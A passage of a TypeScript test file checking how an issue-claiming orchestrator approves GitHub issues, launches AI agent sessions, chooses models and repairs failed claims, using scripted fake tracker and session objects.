// @effect-diagnostics nodeBuiltinImport:off - the tests read real run files and lay out gate locks.
import * as NodeFS from "node:fs";
import * as NodePath from "node:path";

import { assert, it } from "@effect/vitest";
import * as Effect from "effect/Effect";
import * as Logger from "effect/Logger";
import * as Schema from "effect/Schema";
import { afterEach, describe } from "vitest";

import { timeLimitOnlyProjectConfig, type ProjectConfig } from "../config.ts";
import type { Approval, TextCheck } from "../domain/approval.ts";
import { unapprovedComment } from "../domain/approval.ts";
import type { State } from "../domain/lifecycle.ts";
import { gateLockFile } from "../gate.ts";
import { makeCause, type Cause, type RunEvent } from "../ledger/events.ts";
import { Ledger } from "../ledger/ledger.ts";
import { MACHINE_LOG, scanMachineLog } from "../ledger/machineLog.ts";
import { readRun } from "../ledger/read.ts";
import { parseRunId, runPath, type RunId } from "../ledger/runId.ts";
import { T0, useTempDirs } from "../ledger/testSupport.ts";
import {
  SessionsError,
  ThreadNotFoundError,
  type FactoryProject,
  type LaunchRequest,
  type Launched,
  type Model,
  type Thread,
} from "../sessions.ts";
import {
  GitHubFailed,
  GitHubInvalidArgument,
  type ClaimComment,
  type ClaimOutcome,
  type Claimer,
  type OpenPullRequest,
  type FactoryComment,
  type GitHubError,
  type IssueDetail,
  type PullRequest,
} from "../tracker/github.ts";
import {
  CANNOT_CONFIRM,
  CUT_SHORT_COMMENT,
  LAUNCH_FAILED,
  NO_DEFAULT_MODEL,
  NO_PROJECT,
  TEXT_CHANGED,
  launchMessage,
  sessionMayExistNote,
  statusBody,
  stuckComment,
} from "./messages.ts";
import { readProgress } from "./progress.ts";
import {
  CLAIM_GAVE_WAY,
  GateRunningError,
  resume,
  start,
  utcSecond,
  yieldToClaim,
  type Sessions,
  type StartContext,
  type StartOutcome,
  type Tracker,
} from "./start.ts";

const tempDir = useTempDirs();

const REPO = "rawphp/softfac";
const USER = "rawphp";
const LABELED = "2026-10-04T10:00:00Z";

const handles: Array<Ledger> = [];
afterEach(() => {
  for (const ledger of handles.splice(0)) ledger.close();
});

const project = (): ProjectConfig => ({
  ...timeLimitOnlyProjectConfig(),
  instructors: ["tomkaczocha"],
  base: "main",
  gate: ["cargo test"],
});

const detail = (
  state: State | null,
  assignees: ReadonlyArray<string> = [],
  closed = false,
): IssueDetail => ({
  number: 7,
  title: "Build step",
  body: "Build the runner.",
  labels: state === null ? [] : [`factory:${state}`],
  assignees,
  author: "tomkaczocha",
  state,
  closed,
});

const ghFailure = () =>
  new GitHubFailed({ args: ["issue", "edit", "7"], status: 1, stderr: "boom" });

/** Scripted answers: each method pops its next answer, or gives the default when none is queued. */
const fakeTracker = (script: {
  issues?: Array<IssueDetail | GitHubError>;
  approval?: Approval;
  claims?: Array<ClaimOutcome | GitHubError>;
  /** The claim comment that won the issue's current claim (none by default), or a failed read. */
  winner?: ClaimComment | null | GitHubError;
  assignFails?: boolean;
  setStateFails?: boolean;
  unassignFails?: boolean;
  newestComment?: FactoryComment | null;
  textChecks?: Array<TextCheck | GitHubError>;
  /** What each pull request reads as; one that is not listed does not exist. */
  pulls?: Record<number, PullRequest | null | GitHubError>;
  /** Who GitHub says closed the issue: a login, nobody, or a failed read. */
  closedBy?: string | null | GitHubError;
  /** What the tip of a branch reads as: found (the default), a 404, or a failed read. Read at each call. */
  branchTip?: "found" | "missing" | GitHubError;
  /** Branches origin lacks whatever `branchTip` says. */
  missingBranches?: ReadonlyArray<string>;
  /** Whether the issue text was edited since the approval (false by default), or a failed read. Read at each call. */
  editedSince?: boolean | GitHubError;
  /** The open pull requests GitHub says would close the issue (none by default), or a failed read. */
  closing?: ReadonlyArray<OpenPullRequest> | GitHubError;
}) => {
  const calls: Array<string> = [];
  const claimers: Array<Claimer> = [];
  const issues = [...(script.issues ?? [detail("ready")])];
  const claims = [...(script.claims ?? [{ kind: "claimed" } as const])];
  const textChecks = [...(script.textChecks ?? [])];
  const answer = <A>(queue: Array<A | GitHubError>, fallback: A) => {
    const next = queue.length > 1 ? queue.shift()! : (queue[0] ?? fallback);
    return next instanceof Object && "_tag" in next && typeof next._tag === "string"
      ? Effect.fail(next as GitHubError)
      : Effect.succeed(next as A);
  };
  const tracker: Tracker = {
    issue: (n) => {
      calls.push(`issue ${n}`);
      return answer(issues, detail("ready"));
    },
    approval: (n, instructors) => {
      calls.push(`approval ${n} ${instructors.join(",")}`);
      return Effect.succeed(
        script.approval ?? { kind: "approved", labeledAt: LABELED, labeledBy: "tomkaczocha" },
      );
    },
    claim: (n, user, from, to, claimer) => {
      calls.push(`claim ${n} ${user} ${from}->${to}`);
      claimers.push(claimer);
      return answer(claims, { kind: "claimed" });
    },
    claimWinner: (n, trusted) => {
      // Recorded only when there is one, so a test with none keeps its calls.
      const winner = script.winner ?? null;
      if (winner === null) return Effect.succeed(null);
      calls.push(`claimWinner ${n} ${trusted.join(",")}`);
      return "_tag" in winner ? Effect.fail(winner) : Effect.succeed(winner);
    },
    setState: (n, state) => {
      calls.push(`setState ${n} ${state}`);
      return script.setStateFails ? Effect.fail(ghFailure()) : Effect.void;
    },
    assign: (n, user) => {
      calls.push(`assign ${n} ${user}`);
      return script.assignFails ? Effect.fail(ghFailure()) : Effect.void;
    },
    unassign: (n, user) => {
      calls.push(`unassign ${n} ${user}`);
      return script.unassignFails ? Effect.fail(ghFailure()) : Effect.void;
    },
    postComment: (n, body) => {
      calls.push(`comment ${n} ${body}`);
      return Effect.void;
    },
    upsertStatusComment: (n, user, body) => {
      calls.push(`status ${n} ${user} ${body}`);
      return Effect.void;
    },
    newestFactoryComment: (n) => {
      calls.push(`newest ${n}`);
      return Effect.succeed(script.newestComment ?? null);
    },
    textCheck: (n, since, instructors) => {
      calls.push(`textCheck ${n} ${since} ${instructors.join(",")}`);
      return answer<TextCheck>(textChecks, "unchanged");
    },
    pullRequest: (n) => {
      calls.push(`pullRequest ${n}`);
      const pull = script.pulls?.[n] ?? null;
      return pull instanceof Object && "_tag" in pull
        ? Effect.fail(pull as GitHubError)
        : Effect.succeed(pull as PullRequest | null);
    },
    closedBy: (n) => {
      calls.push(`closedBy ${n}`);
      const by = script.closedBy ?? null;
      return typeof by === "object" && by !== null ? Effect.fail(by) : Effect.succeed(by);
    },
    branchTip: (branch) => {
      calls.push(`branchTip ${branch}`);
      const tip = script.missingBranches?.includes(branch)
        ? "missing"
        : (script.branchTip ?? "found");
      if (tip === "missing") {
        return Effect.fail(
          new GitHubFailed({ args: ["api", "ref"], status: 1, stderr: "gh: Not Found (HTTP 404)" }),
        );
      }
      return tip === "found" ? Effect.succeed("a".repeat(40)) : Effect.fail(tip);
    },
    textEditedSince: (n, since) => {
      calls.push(`textEditedSince ${n} ${since}`);
      const edited = script.editedSince ?? false;
      return typeof edited === "boolean" ? Effect.succeed(edited) : Effect.fail(edited);
    },
    openPullRequestsClosing: (n) => {
      calls.push(`openPullRequestsClosing ${n}`);
      const closing = script.closing ?? [];
      return Array.isArray(closing)
        ? Effect.succeed(closing as ReadonlyArray<OpenPullRequest>)
        : Effect.fail(closing as GitHubError);
    },
    // The gate's actions: the claim never performs them.
    markPrReady: () => Effect.die("not the claim's"),
    markPrDraft: () => Effect.die("not the claim's"),
    commentOnPr: () => Effect.die("not the claim's"),
  };
  return { tracker, calls, claimers };
};

const isSessionsError = Schema.is(SessionsError);
const isThreadNotFound = Schema.is(ThreadNotFoundError);

const MODEL: Model = { instanceId: "claudeAgent", model: "claude-opus-5-5" };
const PROJECT: FactoryProject = { id: "proj-1", model: MODEL };
const LAUNCH_ID = "softfac:rawphp__softfac__7__1:launch";
const WORKTREE = "/t3/wt";

/**
 * Scripted answers for the T3 sessions the claim calls. Each method pops its next answer, or
 * repeats the last one. `launch` fails the test when the run's ledger does not yet hold the
 * `launch-sending` step: the step is written before the call, as softfac's own hook checks.
 */
const fakeSessions = (
  dataDir: string,
  script: {
    project?: FactoryProject | null | SessionsError;
    launches?: Array<Launched | SessionsError>;
    archive?: Array<undefined | SessionsError>;
    thread?: Thread | ThreadNotFoundError;
    removeWorktree?: Array<undefined | SessionsError>;
  },
) => {
  const calls: Array<string> = [];
  const launchRequests: Array<LaunchRequest> = [];
  const launches = [...(script.launches ?? [])];
  const archives = [...(script.archive ?? [])];
  const removals = [...(script.removeWorktree ?? [])];
  const popped = <A>(queue: Array<A>): A | undefined =>
    queue.length > 1 ? queue.shift() : queue[0];
  const result = <A>(answer: A | SessionsError | undefined, fallback: A) =>
    isSessionsError(answer)
      ? Effect.fail(answer)
      : Effect.succeed(answer === undefined ? fallback : answer);
  const sessions: Sessions = {
    findProject: (root) => {
      calls.push(`findProject ${root}`);
      return result(script.project === undefined ? PROJECT : script.project, PROJECT);
    },
    launch: (request) => {
      calls.push(`launch ${request.commandId}`);
      launchRequests.push(request);
      const ledgerFile = runPath(
        dataDir,
        parseRunId(request.commandId.slice("softfac:".length, -":launch".length)),
      );
      if (!/"step":"launch-sending[" ]/.test(NodeFS.readFileSync(ledgerFile, "utf8"))) {
        return Effect.die(new Error("launch was called before the launch-sending step"));
      }
      return result(popped(launches), {
        threadId: "thread-1",
        worktreePath: WORKTREE,
        branch: "t3code/abc",
      });
    },
    thread: (threadId) => {
      calls.push(`thread ${threadId}`);
      return isThreadNotFound(script.thread)
        ? Effect.fail(script.thread)
        : Effect.succeed(
            script.thread ?? { worktreePath: WORKTREE, branch: "t3code/abc", archived: false },
          );
    },
    archive: (threadId) => {
      calls.push(`archive ${threadId}`);
      const answer = popped(archives);
      return isSessionsError(answer) ? Effect.fail(answer) : Effect.void;
    },
    removeWorktree: (path) => {
      calls.push(`removeWorktree ${path}`);
      const answer = popped(removals);
      return isSessionsError(answer) ? Effect.fail(answer) : Effect.void;
    },
    send: () => Effect.die("not the claim's"),
  };
  return { sessions, calls, launchRequests };
};

const run7: RunId = { repo: REPO, issue: "7", attempt: 1 };

const isGateRunning = Schema.is(GateRunningError);

const ctxFor = (
  dataDir: string,
  tracker: Tracker,
  sessions: Sessions,
  extra: Partial<StartContext> = {},
): StartContext => ({
  repo: REPO,
  trackerUser: USER,
  machine: "mac-mini",
  project: project(),
  dataDir,
  tracker,
  repoPath: "/work/softfac",
  ghConfigDir: "/gh/rawphp",
  sessions,
  clock: () => T0,
  ...extra,
});

const startIn = (
  dataDir: string,
  tracker: Tracker,
  sessions: Sessions = fakeSessions(dataDir, {}).sessions,
  extra: Partial<StartContext> = {},
) => start(ctxFor(dataDir, tracker, sessions, extra), 7);

const cause = (reason: string): Cause => makeCause("start", reason);
const BUILDING = statusBody("building", "mac-mini", "thread-1", null);
const FINISHED = {
  outcome: "stuck",
  total_ms: 0,
  gate_attempts: 0,
  review_cycles: null,
  pr_url: null,
  pr_end: null,
};

/** The lines of a run that was started, in order: what the ledger holds when the issue is `building`. */
const startedLines = (): Array<{ line: RunEvent; cause: Cause }> => [
  {
    line: { event: "step_changed", data: { step: `approved ${LABELED}` } },
    cause: makeCause("start", "approved", { actor: "tomkaczocha" }),
  },
  {
    line: { event: "claimed", data: { machine: "mac-mini", github_user: USER } },
    cause: cause("claimed"),
  },
  {
    line: { event: "state_changed", data: { from: "ready", to: "triage" } },
    cause: cause("claimed"),
  },
  {
    line: { event: "step_changed", data: { step: "launch-sending" } },
    cause: cause("launch-sending"),
  },
  {
    line: {
      event: "session_launched",
      data: {
        thread_id: "thread-1",
        worktree: WORKTREE,
        branch: "t3code/abc",
        model_instance: "claudeAgent",
        model: "claude-opus-5-5",
        model_options: null,
        resumed_from: null,
        base: "main",
        title: "Build step",
      },
    },
    cause: cause("session-launched"),
  },
  {
    line: { event: "step_changed", data: { step: "approval-rechecked" } },
    cause: cause("approval-rechecked"),
  },
  {
    line: { event: "state_changed", data: { from: "triage", to: "building" } },
    cause: cause("session-started"),
  },
];

const startedEvents = () =>
  startedLines().map(({ line, cause: why }) => ({
    event: line.event,
    data: line.data,
    cause: why,
  }));

/** A run file holding the first `lines` lines of `startedLines()`, as an earlier pass left it. */
const seedRun = (dataDir: string, lines: ReadonlyArray<{ line: RunEvent; cause: Cause }>) => {
  const ledger = Ledger.create(dataDir, run7, { clock: () => T0 - 1000 });
  handles.push(ledger);
  for (const { line, cause: why } of lines) ledger.append(line, why);
};

/** The lines a run ends with when it goes stuck from `triage` on the stuck line `reason`. */
const stuckTail = (reason: string, code: string) => [
  { event: "stuck", data: { reason }, cause: cause(code) },
  { event: "state_changed", data: { from: "triage", to: "stuck" }, cause: cause(code) },
  { event: "finished", data: FINISHED, cause: cause(code) },
];

/** What a stuck run does to the issue, after the session is stopped: the public comment, the label, the release, the status. */
const stuckCalls = (publicReason: string, thread: string | null) => [
  `comment 7 ${stuckComment(publicReason)}`,
  "setState 7 stuck",
  "unassign 7 rawphp",
  `status 7 rawphp ${statusBody("stuck", "mac-mini", thread, null)}`,
];

const entriesOf = (dataDir: string, id: RunId = run7) =>
  readRun(dataDir, id).entries.map((e) => ({ event: e.event, data: e.data, cause: e.cause }));

const stepsOf = (dataDir: string, id: RunId = run7) =>
  readRun(dataDir, id).entries.map((e) => e.event);

/** An older run of issue 7 whose last state is `to`, with the approval it was claimed on when `approved`. */
const olderRun = (
  dataDir: string,
  attempt: number,
  to: State,
  finish = false,
  approved = false,
) => {
  const id = { ...run7, attempt };
  const ledger = Ledger.create(dataDir, id, { clock: () => T0 - 1000 });
  handles.push(ledger);
  const cause = makeCause("start", "claimed");
  if (approved) {
    ledger.append({ event: "step_changed", data: { step: `approved ${LABELED}` } }, cause);
  }
  ledger.append({ event: "claimed", data: { machine: "m", github_user: USER } }, cause);
  ledger.append({ event: "state_changed", data: { from: "ready", to } }, cause);
  if (finish) ledger.finish("stuck", null, null, cause);
  return id;
};

describe("start: a fresh ready issue", () => {
  it.effect("claims, launches the session and moves the issue to building", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, {
        kind: "started",
        run: run7,
        threadId: "thread-1",
      } satisfies StartOutcome);
      assert.deepStrictEqual(calls, [
        "issue 7",
        "approval 7 tomkaczocha",
        "claim 7 rawphp ready->triage",
        // The launch is decided on: an open pull request of the issue would be resumed.
        "openPullRequestsClosing 7",
        `textCheck 7 ${LABELED} tomkaczocha`,
        "setState 7 building",
        `status 7 rawphp ${BUILDING}`,
      ]);
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac", `launch ${LAUNCH_ID}`]);
      assert.deepStrictEqual(t3.launchRequests, [
        {
          commandId: LAUNCH_ID,
          projectId: "proj-1",
          title: "rawphp/softfac#7 Build step",
          baseRef: "main",
          message: launchMessage(REPO, 7, USER),
          model: MODEL,
        },
      ]);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("launches on the project's model and records it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({});
      const model = { instanceId: "codex", model: "gpt-5.5" };
      const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model } });
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(t3.launchRequests[0]!.model, model);
      assert.deepStrictEqual(entriesOf(dataDir)[4]!.data, {
        thread_id: "thread-1",
        worktree: WORKTREE,
        branch: "t3code/abc",
        model_instance: "codex",
        model: "gpt-5.5",
        model_options: null,
        resumed_from: null,
        base: "main",
        title: "Build step",
      });
    }),
  );

  it.effect("launches on the model `launchModel` picks while the project's model cools down", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({});
      const model = { instanceId: "claudeAgent", model: "claude-fable-5-1" };
      const fallback = { instanceId: "claudeAgent", model: "claude-opus-5-5" };
      const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model } });
      const asked: Array<string> = [];
      yield* startIn(dataDir, tracker, t3.sessions, {
        launchModel: (m) => {
          asked.push(m.model);
          return fallback;
        },
      });
      assert.deepStrictEqual(asked, ["claude-fable-5-1"]);
      assert.deepStrictEqual(t3.launchRequests[0]!.model, fallback);
      const steps = entriesOf(dataDir)
        .filter((e) => e.event === "step_changed")
        .map((e) => (e.data as { step: string }).step);
      assert.deepStrictEqual(steps.slice(1, 3), ["launch-model claude-opus-5-5", "launch-sending"]);
      assert.deepStrictEqual(entriesOf(dataDir).find((e) => e.event === "session_launched")!.data, {
        thread_id: "thread-1",
        worktree: WORKTREE,
        branch: "t3code/abc",
        model_instance: "claudeAgent",
        model: "claude-opus-5-5",
        model_options: null,
        resumed_from: null,
        base: "main",
        title: "Build step",
      });
    }),
  );

  it.effect("a launch sent again keeps the model the first send decided and asks no cooldown", () =>
    Effect.gen(function* () {
      const fable = { instanceId: "claudeAgent", model: "claude-fable-5-1" };
      for (const [pinned, expected] of [
        [["launch-model claude-opus-5-5"], "claude-opus-5-5"],
        [[], "claude-fable-5-1"],
      ] as const) {
        const dataDir = tempDir();
        seedRun(dataDir, [
          ...startedLines().slice(0, 3),
          ...pinned.map((step) => ({
            line: { event: "step_changed", data: { step } } as RunEvent,
            cause: cause("launch-sending"),
          })),
          startedLines()[3]!,
        ]);
        const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
        const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model: fable } });
        const asked: Array<string> = [];
        yield* startIn(dataDir, tracker, t3.sessions, {
          launchModel: (m) => {
            asked.push(m.model);
            return { ...m, model: "claude-sonnet-5-5" };
          },
        });
        assert.deepStrictEqual(asked, [], expected);
        assert.deepStrictEqual(t3.launchRequests[0]!.model, { ...fable, model: expected });
        const launched = entriesOf(dataDir).find((e) => e.event === "session_launched")!;
        assert.strictEqual((launched.data as { model: string }).model, expected);
      }
    }),
  );

  it.effect("a launch decided again writes its model over one a crash left unsent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, [
        ...startedLines().slice(0, 3),
        {
          line: { event: "step_changed", data: { step: "launch-model claude-opus-5-5" } },
          cause: cause("launch-sending"),
        },
      ]);
      const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
      const fable = { instanceId: "claudeAgent", model: "claude-fable-5-1" };
      const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model: fable } });
      yield* startIn(dataDir, tracker, t3.sessions, { launchModel: (m) => m });
      assert.deepStrictEqual(t3.launchRequests[0]!.model, fable);
      assert.strictEqual(
        readProgress(readRun(dataDir, run7).entries).launchModel,
        "claude-fable-5-1",
      );
    }),
  );

  it.effect("records the provider options the project's model carries", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({});
      const options = [{ id: "reasoningEffort", value: "high" }];
      const model = { instanceId: "codex", model: "gpt-5.5", options };
      const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model } });
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(t3.launchRequests[0]!.model, model);
      assert.deepStrictEqual(entriesOf(dataDir)[4]!.data, {
        thread_id: "thread-1",
        worktree: WORKTREE,
        branch: "t3code/abc",
        model_instance: "codex",
        model: "gpt-5.5",
        model_options: options,
        resumed_from: null,
        base: "main",
        title: "Build step",
      });
    }),
  );

  it.effect("records a launch that has no worktree yet", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {
        launches: [{ threadId: "thread-1", worktreePath: null, branch: null }],
      });
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(entriesOf(dataDir)[4]!.data, {
        thread_id: "thread-1",
        worktree: null,
        branch: null,
        model_instance: "claudeAgent",
        model: "claude-opus-5-5",
        model_options: null,
        resumed_from: null,
        base: "main",
        title: "Build step",
      });
    }),
  );

  it.effect("a refusal posts the comment, moves the issue to proposed and makes no run", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const refusal = { kind: "labeled-by-non-instructor", by: "eve", labeledAt: LABELED } as const;
      const { tracker, calls } = fakeTracker({ approval: { kind: "refused", refusal } });
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, {
        kind: "refused",
        reason: "issue #7 was not approved: factory:ready was not applied by an instructor",
      });
      assert.deepStrictEqual(calls, [
        "issue 7",
        "approval 7 tomkaczocha",
        "newest 7",
        `comment 7 ${unapprovedComment(refusal)}`,
        "setState 7 proposed",
      ]);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
    }),
  );

  it.effect("a refusal already explained since the label is not commented again", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const refusal = { kind: "edited-after-label", labeledAt: LABELED } as const;
      const { tracker, calls } = fakeTracker({
        approval: { kind: "refused", refusal },
        newestComment: { body: unapprovedComment(refusal), createdAt: "2026-10-04T10:00:01Z" },
      });
      yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(calls, [
        "issue 7",
        "approval 7 tomkaczocha",
        "newest 7",
        "setState 7 proposed",
      ]);
      // The same comment from before the label is about an earlier refusal: said again.
      const before = fakeTracker({
        approval: { kind: "refused", refusal },
        newestComment: { body: unapprovedComment(refusal), createdAt: "2026-10-04T09:59:59Z" },
      });
      yield* startIn(tempDir(), before.tracker);
      assert.ok(
        before.calls.some((c) => c.startsWith("comment 7 ")),
        before.calls.join("\n"),
      );
    }),
  );

  it.effect("a refusal with no label time is not repeated within an hour", () =>
    Effect.gen(function* () {
      const refusal = { kind: "label-not-found" } as const;
      const recent = fakeTracker({
        approval: { kind: "refused", refusal },
        newestComment: { body: unapprovedComment(refusal), createdAt: "2026-10-04T09:30:00Z" },
      });
      // The clock reads 2026-10-04T10:13:16.123Z: the comment is 43 minutes old.
      yield* startIn(tempDir(), recent.tracker);
      assert.ok(!recent.calls.some((c) => c.startsWith("comment 7 ")), recent.calls.join("\n"));
      const old = fakeTracker({
        approval: { kind: "refused", refusal },
        newestComment: { body: unapprovedComment(refusal), createdAt: "2026-10-04T09:00:00Z" },
      });
      yield* startIn(tempDir(), old.tracker);
      assert.ok(
        old.calls.some((c) => c.startsWith("comment 7 ")),
        old.calls.join("\n"),
      );
    }),
  );

  it.effect("an issue that is assigned, closed or not ready is skipped with nothing written", () =>
    Effect.gen(function* () {
      const notOurs = "issue #7 is not factory:triage assigned to rawphp alone";
      for (const [issue, expected] of [
        [detail("ready", ["a", "b"]), { reason: "issue #7 is already assigned to a, b" }],
        [detail("ready", [], true), { reason: "issue #7 is closed", moved: "closed" }],
        [detail("building", [USER]), { reason: notOurs }],
        [detail("triage", ["eve"]), { reason: notOurs }],
        [detail(null), { reason: notOurs }],
      ] as const) {
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({ issues: [issue] });
        const t3 = fakeSessions(dataDir, {});
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        assert.deepStrictEqual(outcome, { kind: "skipped", ...expected });
        assert.deepStrictEqual(calls, ["issue 7"]);
        assert.deepStrictEqual(t3.calls, []);
        assert.strictEqual(NodeFS.existsSync(NodePath.join(dataDir, "runs")), false);
      }
    }),
  );

  it.effect("a claim that finds an assignee is skipped and makes no run", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({ claims: [{ kind: "skipped-assigned", assignees: ["a"] }] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "issue #7 is already assigned to a",
      });
      // T3 is asked before the claim; nothing is launched for a claim someone else won.
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
    }),
  );
});

describe("start: a claim call that fails", () => {
  it.effect("is finished even when the machine log cannot be written, which is logged", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      // A directory where the log file goes: the machine log cannot be opened.
      NodeFS.mkdirSync(NodePath.join(dataDir, MACHINE_LOG), { recursive: true });
      const { tracker } = fakeTracker({
        issues: [detail("ready"), detail("triage", [USER])],
        claims: [ghFailure()],
      });
      const warnings: Array<string> = [];
      const capture = Logger.make(({ logLevel, message }) => {
        if (logLevel === "Warn")
          warnings.push(String(Array.isArray(message) ? message[0] : message));
      });
      const outcome = yield* startIn(dataDir, tracker).pipe(
        Effect.provide(Logger.layer([capture], { mergeWithExisting: false })),
      );
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
      assert.deepStrictEqual(warnings, [
        "claim_repaired (finished) for rawphp/softfac#7 could not be written to the machine log",
      ]);
    }),
  );

  it.effect("is finished when GitHub applied it, and says so in the machine log", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", [USER])],
        claims: [ghFailure()],
      });
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
      assert.deepStrictEqual(calls.slice(0, 4), [
        "issue 7",
        "approval 7 tomkaczocha",
        "claim 7 rawphp ready->triage",
        "issue 7",
      ]);
      assert.deepStrictEqual(
        scanMachineLog(dataDir).map((e) => [e.event, e.data]),
        [["claim_repaired", { repo: REPO, issue: 7, outcome: "finished" }]],
      );
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("adds the missing assignee when only the labels moved", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", [])],
        claims: [ghFailure()],
      });
      assert.deepStrictEqual(yield* startIn(dataDir, tracker), {
        kind: "started",
        run: run7,
        threadId: "thread-1",
      });
      assert.deepStrictEqual(calls.slice(3, 5), ["issue 7", "assign 7 rawphp"]);
    }),
  );

  it.effect("is the error when nothing was applied, with nothing written", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("ready", [])],
        claims: [ghFailure()],
      });
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(calls.slice(3), ["issue 7"]);
      // Nothing was launched, and no run file exists to hold a launch.
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
      assert.deepStrictEqual(scanMachineLog(dataDir), []);
    }),
  );

  it.effect("releases the issue to proposed with a comment when it cannot be finished", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", [])],
        claims: [ghFailure()],
        assignFails: true,
      });
      const error = yield* Effect.flip(startIn(dataDir, tracker));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(calls.slice(3), [
        "issue 7",
        "assign 7 rawphp",
        "unassign 7 rawphp",
        "setState 7 proposed",
        `comment 7 ${CUT_SHORT_COMMENT}`,
      ]);
      assert.deepStrictEqual(
        scanMachineLog(dataDir).map((e) => [e.event, e.data]),
        [["claim_repaired", { repo: REPO, issue: 7, outcome: "released" }]],
      );
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
    }),
  );

  it.effect("sets the label when the issue is ours but still labelled ready", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("ready", [USER])],
        claims: [ghFailure()],
      });
      assert.deepStrictEqual(yield* startIn(dataDir, tracker), {
        kind: "started",
        run: run7,
        threadId: "thread-1",
      });
      assert.deepStrictEqual(calls.slice(3, 5), ["issue 7", "setState 7 triage"]);
      assert.deepStrictEqual(
        scanMachineLog(dataDir).map((e) => [e.event, e.data]),
        [["claim_repaired", { repo: REPO, issue: 7, outcome: "finished" }]],
      );
    }),
  );

  it.effect("assigns and labels when both factory labels are gone and nobody is assigned", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail(null, [])],
        claims: [ghFailure()],
      });
      assert.deepStrictEqual(yield* startIn(dataDir, tracker), {
        kind: "started",
        run: run7,
        threadId: "thread-1",
      });
      assert.deepStrictEqual(calls.slice(3, 6), [
        "issue 7",
        "assign 7 rawphp",
        "setState 7 triage",
      ]);
      assert.deepStrictEqual(
        scanMachineLog(dataDir).map((e) => [e.event, e.data]),
        [["claim_repaired", { repo: REPO, issue: 7, outcome: "finished" }]],
      );
    }),
  );

  it.effect("is the error, with nothing written, when someone else is assigned", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready"), detail("triage", ["eve"])],
        claims: [ghFailure()],
      });
      const error = yield* Effect.flip(startIn(dataDir, tracker));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(calls.slice(3), ["issue 7"]);
      assert.deepStrictEqual(scanMachineLog(dataDir), []);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
    }),
  );

  it.effect("is the error, untouched, when the issue cannot be read again", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({
        issues: [detail("ready"), ghFailure()],
        claims: [new GitHubFailed({ args: ["x"], status: 2, stderr: "first" })],
      });
      const error = yield* Effect.flip(startIn(dataDir, tracker));
      assert.ok(error._tag === "GitHubFailed" && error.stderr === "first");
    }),
  );
});

describe("start: an issue in triage that is ours", () => {
  it.effect("with no run goes stuck: the factory cannot confirm what it was approved on", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER])] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
